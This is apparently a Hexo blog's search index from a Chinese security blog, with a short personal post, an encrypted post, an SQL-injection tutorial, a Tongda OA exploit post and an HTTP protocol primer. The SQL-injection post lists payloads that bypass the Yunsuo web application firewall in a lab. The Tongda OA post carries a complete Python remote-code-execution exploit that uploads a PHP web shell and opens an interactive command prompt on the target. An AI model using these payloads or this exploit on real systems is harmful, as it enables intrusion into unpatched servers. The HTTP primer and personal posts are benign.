<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>少年</title>
    <url>/php00py.github.io/archives/b452d568.html</url>
    <content><![CDATA[<p>我还记得第一次看到你的场景，那时的我并没想到现在你对我是那么重要。</p>
<a id="more"></a>
<p>要记住每一个对你好的人，因为他们本可以不这么做的。 </p>
<p>好好努力，争取在2021年的时候买一辆车。</p>
<p><img src="https://img-blog.csdnimg.cn/20200414121547865.jpg" alt="少年"></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年4月4日的一天</title>
    <url>/php00py.github.io/archives/a9ec761a.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">welecom to my blog,enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="22e41fbde4f2a770599763fca522b27451a2428cbf2cae85b99644a2dec72543">644d0fae0997ddb536342dd7799f95cf71947b58f7f292f1510f00884129b52d88eca96f13d9ee6283c0c9a98cd2396028a0cd676ec05713d8561d7f3bf05bb78db481d24f2d22817396f6cb68516fa5e0b9a26b462cc16fe33d589569c9ec380153fcc72e7f3a5e1e6a2a40978476423bb66b0b66232f1eef52095055c5ed525b8408f634719efd00bb7db01e0648579e4f33453199dee61914a5bd48f1b04754110b865d0c5fb860356b049fd343e1fbc86a3d144b151362cfe4245dee33b3ef5e85790d3df71b8855e9444601e4e4cc16bf197fd8363eca7e4b88164e636019c8ff98d3e6af018a711181af8595f6fc7a6c62777befc90b63d72bddb723bc0aa586360593f8f9dea9b06d8686fd7ff7fd0edcd02fe09cc6c404f89e0069664e75f50648c0f4dfae7991e5cc8d6ec80bf19b46f72771b0fb2da32e42a9dbca5d48de13b6e653c594001e2fc140b096d381c238a34e8867c21b1cfc04632c5643ecf5bb49a5998fc8b317e808630fc060ba3541f8b0ba69d8d28072147f4a5501afdc063716a829cdc4bfc1d0f14fa4558d234161f78d5ece9cf92bebfa69d187b8ac967176095e69b5072a1d0c8ac08609ac7651f7b5afd024c0b17db6f3c5c216171f23f4a538dbcdf97841fb7775f2ecc29a44ade18ac30d4bef0826898c7790fef86e3cf62aab0d262f92668094d06c201b50c8e094e8e20b9300e5215b89da1c372c01ecb6e71423d497c69ff3ec3739bc35326acba5ee27306cab83f64e7e1b5d0a4578cb4c04496fc79af624e20268ea19b32ffe90fed90b83c4c24d78bde804cfb6e82d1a723fcc96c9a71a9f9f2d594b94bdaa1c80e1059b5d873aebf46bd13c324bac823561a6b147a31d61b9cbc85ddfe5aa1b60c3145130bb2607bf1163f3f2a2ee46740317d4f44d93a6baac913f058b87ff66e7084d74ebd8684edcd5ea5858195b7d52a1a100d07b88a47ec6823d6087681ffc9cc38912295a05ea8517452d506bafbec288beabf733852dfa33b4825c62dfee9f3ff6e02b8fd60c3b164dce5a05a883e1f7dd7dc72d38753dc368810313de3280bcba4c853288279eb811ddafae8dfffe48981c43f2cb7b8d842345a6f63731953ba892e926284dad15b0407261bb1d86adaafe8c29672a0c3db0b91a4f4908111eee3abf03f4dfd550f7efe034f3fb8a000c0c6e74a576a68402fd46526d89312b6c36c34a1195bcdca692ae3c544ca557a20b9b4cd79d99273f3f1454bd0ed84a7d14fe18c001bc3d97162a8a1c8e45db2268045a591d637cb55b04ef2958bf1ac3d18da116bc44a80f5f3596656639247f95ba987805ba8e347e6de36602b4cbd4d0d35b6a5eb3fb10030f868341231bbcfc90c8df81b06e910fd36a26634e8ec45d63e08812c0dfddb5248dd62c8f14fa87a2121eef796c7786ae971e5a0858c7bcc05a98d267907d1f298676d694b1f91d6293c9d1628950d1b73a9fbe1e08be09edc492afbdeb0a51fdb1887caeb4da624422026fedc2cbbcf686dd414ae83172fe0648b19fe7ad95370daf0412d8e77f27a777016ae2c8ba78fa51e28506d909698e016496ad8df651899846c27b08974bc9f591698fa5dd3d7afdbe94271fb09916097c592da0e1286393f1ad0d78182d6e7478f1ed7a51d75b2677e4b3d0240ac1735d61634d7b4153232f557ce78df15cdd7bdcad2d5a244a5c396dfd58e98a42a27c925906e231fc869dc15340494e5b204786f595ee4e3901869e68633d5496548e950c30e2aa4351956f27ff15ee1630d6dfed89c95a4fa3d3cc467e7dc11c52a39e630ad9b823444fade3d60519ada7ad5fafafb71d2d5b32386b8273da87e158dd824e217f6eed3157aae0682731cbf52157a9c9a8bef7c507d92c213fd25b686f12dd977f1410c7b32dfb089320ce1c026709d5c7c6dbcff05461c9e722ec30eebf9c74a5605ae9099f7ef47b1012a01972a16866e6b1eaf2b80fef45b1f25f749b841e182a0b49c248fbead05156c0343205bdb0c55f30854f652ff5dee0747cdf5f0199ba9e438f31a82cc9e1547d36bdb8cb9c36239c696577c908675ae6968b370b7aa88d7ea9c7af983f159da752b8bac289f76f2770bccff3c8fe2348f9ba1fe0adc3f6b02d456662f5f9caec2bfb380979f5b2aa489a4610883b15fefc4462d23c13e702575a5de64a</script>
</div>
<script src="/php00py.github.io/lib/blog-encrypt.js"></script><link href="/php00py.github.io/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>清明</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入bybass云锁</title>
    <url>/php00py.github.io/archives/71a77bb5.html</url>
    <content><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>云锁官网<br><a href="https://www.yunsuo.com.cn/" target="_blank" rel="noopener">https://www.yunsuo.com.cn/</a><br>下载的是公有云版本 云锁服务器端Windows版本</p>
<p>搭建的服务器是phpstudy版本的 Apache+mysql</p>
<p>使用的漏洞集成是pikachu的字符型SQL注入</p>
<h1 id="漏洞页面"><a href="#漏洞页面" class="headerlink" title="漏洞页面"></a>漏洞页面</h1><p><a href="http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe&amp;submit=%E6%9F%A5%E8%AF%A2" target="_blank" rel="noopener">http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe&amp;submit=%E6%9F%A5%E8%AF%A2</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200414121843382.png" alt=""></p>
<h2 id="判断当前字段数"><a href="#判断当前字段数" class="headerlink" title="判断当前字段数"></a>判断当前字段数</h2><p>payload: kobe’ order by 2 –+<br>and 1=1 –+ 不拦截<br>and 1=2 –+  不拦截<br>order by 拦截了 </p>
<p><a href="http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe%27%20order%20by%203%20--+&amp;submit=%E6%9F%A5%E8%AF%A2" target="_blank" rel="noopener">http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe%27%20order%20by%203%20--+&amp;submit=%E6%9F%A5%E8%AF%A2</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200414122025205.png" alt="在这里插入图片描述"></p>
<p>使用内联注入 /<em>!100001by</em>/ /<em>!500005by</em>/</p>
<p>bypass: kobe’ order /<em>!10001by</em>/2</p>
<p><img src="https://img-blog.csdnimg.cn/20200414122102659.png" alt="在这里插入图片描述"></p>
<h2 id="判断显示位置"><a href="#判断显示位置" class="headerlink" title="判断显示位置"></a>判断显示位置</h2><p>kobe’ and 1=2 union select 1,2 –+<br>拦截了union select</p>
<p><img src="https://img-blog.csdnimg.cn/20200414122141866.png" alt="在这里插入图片描述"></p>
<p>union 不拦截<br>select 不拦截<br>union select  拦截<br>union 字符 select 拦截<br>union /<em>select</em>/ 不拦截 </p>
<p>bypass: kobe’ and 1=2 union /<em>!10000all select</em>/ 1,2  kobe’ and 1=2 union /<em>!50000all select</em>/ 1,2<br>显示的位置为1和2</p>
<p><img src="https://img-blog.csdnimg.cn/20200414122312695.png" alt="在这里插入图片描述"></p>
<p>拦截了database() ，use()<br>bypass:<code>database/**/() user/**/()</code></p>
<p>完整的bypass语句：kobe’ and 1=2 union /<em>!50001all select</em>/ database<code>/**/(),user/**/()</code> –+</p>
<p><img src="https://img-blog.csdnimg.cn/20200414122349155.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>通达oa文件上传+文件包含远程代码执行漏洞</title>
    <url>/php00py.github.io/archives/de0d7bed.html</url>
    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>通达OA是一套办公系统.近日通达OA官方在其官方论坛披露了近期一起通达OA用户服务器遭受勒索病毒攻击事件并发布了多个版本的漏洞补丁.漏洞类型为任意文件上传,受影响的版本存在文件包含漏洞. 未授权的远程攻击者可以通过精心构造的请求包进行文件包含并触发远程代码执行.</p>
<h2 id="OA通达简介"><a href="#OA通达简介" class="headerlink" title="OA通达简介"></a>OA通达简介</h2><p>通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。2015年，通达云OA入驻阿里云企业应用专区，已为众多中小企业提供了稳定、可靠、强悍的云计算支撑。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>tongdaOA V11<br>tangdaOA 2017<br>tangdaOA 2016<br>tangdaOA 2015<br>tangdaOA 2013 增强版<br>tangdaOA 2013</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>版本    更新包下载地址<br>V11版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe</a><br>2017版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe</a><br>2016版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe</a><br>2015版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe</a><br>2013增强版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe</a><br>2013版    <a href="http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe" target="_blank" rel="noopener">http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>通过官网下载OA软装.<br><img src="https://img-blog.csdnimg.cn/20200319134816478.png" alt="在这里插入图片描述"></p>
<p>在window下执行TDOA11.3默认提示安装<br><img src="https://img-blog.csdnimg.cn/20200319135009254.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135022896.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319134951736.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135046159.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135057980.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135113728.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135131943.png" alt="在这里插入图片描述"><br>默认用户admin，密码为空</p>
<p>上传文件<br><img src="https://img-blog.csdnimg.cn/20200319135228606.png" alt="在这里插入图片描述"><br>文件包含<br><img src="https://img-blog.csdnimg.cn/20200319135914479.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200319135659413.png" alt="在这里插入图片描述"></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># oa通达文件上传加文件包含远程代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oa</span><span class="params">(url)</span>:</span></span><br><span class="line">    upurl = url + <span class="string">'/ispirit/im/upload.php'</span></span><br><span class="line">    headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=---------------------------27723940316706158781839860668"</span>&#125;</span><br><span class="line">    data = <span class="string">"-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh-&gt;exec(\"cmd /c \".$command);\r\n$stdout = $exec-&gt;StdOut();\r\n$stroutput = $stdout-&gt;ReadAll();\r\necho $stroutput;\r\n?&gt;\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"</span></span><br><span class="line">    req = requests.post(url=upurl, headers=headers, data=data)</span><br><span class="line">    filename = <span class="string">""</span>.join(re.findall(<span class="string">"2003_(.+?)\|"</span>,req.text))</span><br><span class="line">    in_url = url + <span class="string">'/ispirit/interface/gateway.php'</span></span><br><span class="line">    headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"X-Forwarded-For"</span>: <span class="string">"127.0.0.1"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">    data = <span class="string">"json=&#123;\"url\":\"../../../general/../attach/im/2003/%s.jpg\"&#125;&amp;cmd=%s"</span> % (filename,<span class="string">"echo php00py"</span>)</span><br><span class="line">    include_req = requests.post(url=in_url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span>  <span class="string">'php00py'</span> <span class="keyword">in</span> include_req.text:</span><br><span class="line">        print(<span class="string">"[+] OA RCE vulnerability "</span>)</span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Not OA RCE vulnerability "</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oa_rce</span><span class="params">(url, filename,command)</span>:</span></span><br><span class="line">    url = url + <span class="string">'/ispirit/interface/gateway.php'</span></span><br><span class="line">    headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</span><br><span class="line">    data = <span class="string">"json=&#123;\"url\":\"../../../general/../attach/im/2003/%s.jpg\"&#125;&amp;cmd=%s"</span> % (filename,command)</span><br><span class="line">    req = requests.post(url, headers=headers, data=data)</span><br><span class="line">    print(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">"please input your url python oa_rce.py http://127.0.0.1:8181"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url = sys.argv[<span class="number">1</span>]</span><br><span class="line">            filename = oa(url)</span><br><span class="line">            <span class="keyword">while</span> filename:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    command = input(<span class="string">"wran@shelLhost#"</span>)</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">if</span> command == <span class="string">"exit"</span> <span class="keyword">or</span> command == <span class="string">"quit"</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        oa_rce(url,filename,command)</span><br><span class="line">                <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>远程代码执行</category>
      </categories>
      <tags>
        <tag>远程代码执行</tag>
        <tag>文件上传</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>http协议</title>
    <url>/php00py.github.io/archives/4c2f67f.html</url>
    <content><![CDATA[<h1 id="http简介"><a href="#http简介" class="headerlink" title="http简介"></a>http简介</h1><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。。</p>
<h1 id="http工作原理"><a href="#http工作原理" class="headerlink" title="http工作原理"></a>http工作原理</h1><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<ol>
<li><p>客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。如<a href="http://www.rqlyy.top">www.rqlyy.top</a></p>
</li>
<li><p>发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
</li>
<li><p>服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
</li>
<li><p>释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
</li>
<li><p>客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
</li>
</ol>
<p>在游览器上输入URL(<a href="http://www.rqlyy.top)点击回车确认后。会经历以下过程：">www.rqlyy.top)点击回车确认后。会经历以下过程：</a><br>查找本地缓存或者本地host文件或者dns服务器将URL（<a href="http://www.rqlyy.top）解析成IP地址；" target="_blank" rel="noopener">www.rqlyy.top）解析成IP地址；</a><br>解析的ip建立起tcp与服务器连接；<br>浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;<br>服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;<br>释放tcp连接<br>游览器在解析html渲染显示在界面</p>
<p><img src="https://img-blog.csdnimg.cn/20200414095130985.png?x-oss-process=image0" alt="在这里插入图片描述"><br>CGI(Common Gateway Interface) 是 HTTP 服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。</p>
<p>绝大多数的 CGI 程序被用来解释处理来自表单的输入信息，并在服务器产生相应的处理，或将相应的信息反馈给浏览器。CGI 程序使网页具有交互功能。</p>
<h1 id="http结构"><a href="#http结构" class="headerlink" title="http结构"></a>http结构</h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成<br><img src="https://img-blog.csdnimg.cn/20200414100237965.png" alt="在这里插入图片描述">HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。<br><img src="https://img-blog.csdnimg.cn/20200414101146174.png" alt="http响应"></p>
<h1 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h1><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p>
<p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p>
<table>
<thead>
<tr>
<th>请求方法</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求指定的页面信息，并返回实体主体</td>
</tr>
<tr>
<td>POST</td>
<td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改</td>
</tr>
<tr>
<td>HEAD</td>
<td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
</tr>
<tr>
<td>PUT</td>
<td>从客户端向服务器传送的数据取代指定的文档的内容</td>
</tr>
<tr>
<td>DELETE</td>
<td>请求服务器删除指定的页面</td>
</tr>
<tr>
<td>CONNECT</td>
<td>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>允许客户端查看服务器的性能</td>
</tr>
<tr>
<td>TRACE</td>
<td>回显服务器收到的请求，主要用于测试或诊断</td>
</tr>
<tr>
<td>PATCH</td>
<td>是对 PUT 方法的补充，用来对已知资源进行局部更新</td>
</tr>
</tbody></table>
<h1 id="http请求头"><a href="#http请求头" class="headerlink" title="http请求头"></a>http请求头</h1><p>每个头域由一个域名，冒号（:）和域值三部分组成。域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。</p>
<p>Transport 头域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Connection：</span><br><span class="line">作用：表示是否需要持久连接。</span><br><span class="line">如果服务器看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP <span class="number">1.1</span>（HTTP <span class="number">1.1</span>默认进行持久连接）,它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，服务器需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入 ByteArrayOutputStream，然后在正式写出内容之前计算它的大小；</span><br><span class="line">例如：　Connection: keep-alive   当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的  网页，会继续使用这一条已经建立的连接</span><br><span class="line">例如：Connection: close  代表一个Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭，  当客户端再次发送Request，需要重新建立TCP连接。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Host:（发送请求时，该报文头域是必需的）</span><br><span class="line">Host请求报文头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的。</span><br><span class="line">例如：http://www.rqlyy.top/index.html</span><br><span class="line">浏览器发送的请求消息中，就会包含Host请求报头域，如下：</span><br><span class="line">Host：rqlyy.top</span><br><span class="line">此处使用缺省端口号<span class="number">80</span>，若指定了端口号<span class="number">8081</span>，则变成：Host：rqlyy.top:<span class="number">8081</span></span><br><span class="line"></span><br><span class="line">Client 头域</span><br><span class="line"></span><br><span class="line">Accept：</span><br><span class="line">作用：浏览器可以接受的媒体类型（MIME类型）,</span><br><span class="line">例如：Accept: text/html  代表浏览器可以接受服务器回发的类型为 text/html  也就是我们常说的html文档, 如果服务器无法返回text/html类型的数据，服务器应该返回一个<span class="number">406</span>错误(non acceptable)。</span><br><span class="line">通配符 * 代表任意类型。例如  Accept: */*  代表浏览器可以处理所有类型，(一般浏览器发给服务器都是发这个)</span><br><span class="line"></span><br><span class="line">Accept-Encoding：</span><br><span class="line">作用：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），（注意：这不是只字符编码）;</span><br><span class="line">例如：Accept-Encoding: gzip, deflate。Server能够向支持gzip/deflate的浏览器返回经gzip或者deflate编码的HTML页面。许多情形下这可以减少<span class="number">5</span>到<span class="number">10</span>倍的下载时间，也节省带宽。</span><br><span class="line"></span><br><span class="line">Accept-Language：</span><br><span class="line">作用：浏览器申明自己接收的语言。</span><br><span class="line">语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等；</span><br><span class="line">例如：Accept-Language:zh-cn 。如果请求消息中没有设置这个报头域，服务器假定客户端对各种语言都可以接受。</span><br><span class="line"></span><br><span class="line">User-Agent：</span><br><span class="line">作用：告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本.</span><br><span class="line">我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本，你所使用的浏览器的名称和版本，这往往让很多人感到很神奇，实际上， 服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。</span><br><span class="line">例如：User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">8.0</span>; Windows NT <span class="number">5.1</span>; Trident/<span class="number">4.0</span>; CIBA; .NET CLR <span class="number">2.0</span><span class="number">.50727</span>; .NET CLR <span class="number">3.0</span><span class="number">.4506</span><span class="number">.2152</span>; .NET CLR <span class="number">3.5</span><span class="number">.30729</span>; .NET4<span class="number">.0</span>C; InfoPath<span class="number">.2</span>; .NET4<span class="number">.0</span>E)</span><br><span class="line"></span><br><span class="line">Accept-Charset：</span><br><span class="line">作用：浏览器申明自己接收的字符集，这就是本文前面介绍的各种字符集和字符编码，如gb2312，utf<span class="number">-8</span>（通常我们说Charset包括了相应的字符编码方案）；</span><br><span class="line">例如：Accept-Charset:iso<span class="number">-8859</span><span class="number">-1</span>,gb2312.如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中；</span><br><span class="line">Authorization请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为<span class="number">401</span>（未授权），可以发送一个包含Authorization请求报头域的请求，要求服务器对其进行验证。</span><br><span class="line"></span><br><span class="line">Cookie/Login 头域</span><br><span class="line"></span><br><span class="line">Cookie:</span><br><span class="line">作用：最重要的header, 将cookie的值发送给HTTP 服务器</span><br><span class="line"></span><br><span class="line">Entity头域</span><br><span class="line"></span><br><span class="line">Content-Length</span><br><span class="line">作用：发送给HTTP服务器数据的长度。即请求消息正文的长度；</span><br><span class="line">例如：Content-Length: <span class="number">38</span></span><br><span class="line"></span><br><span class="line">Content-Type：</span><br><span class="line">作用：指定Body的类型。</span><br><span class="line">例如：Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Type主要有四类：</span><br><span class="line"><span class="number">1.</span>text/html</span><br><span class="line">请求Web页面时返回响应的类型，Body中返回html文本。</span><br><span class="line"><span class="number">2.</span>x-www-form-urlencoded</span><br><span class="line">Web页面纯文本表单的提交方式。</span><br><span class="line"><span class="number">3.</span>multitype/form-data</span><br><span class="line">Web页面含有二进制文件时的提交方式。</span><br><span class="line"><span class="number">4.</span>application/json,image/jpeg,application/zip...</span><br><span class="line">单项内容（文本或非文本都可以），用于Web Api的响应或者POST/PUT的请求。</span><br><span class="line"></span><br><span class="line">Miscellaneous 头域</span><br><span class="line"></span><br><span class="line">Referer:</span><br><span class="line">作用：提供了Request的上下文信息的服务器，告诉服务器我是从哪个链接过来的，比如从我主页上链接到一个朋友那里， 他的服务器就能够从HTTP 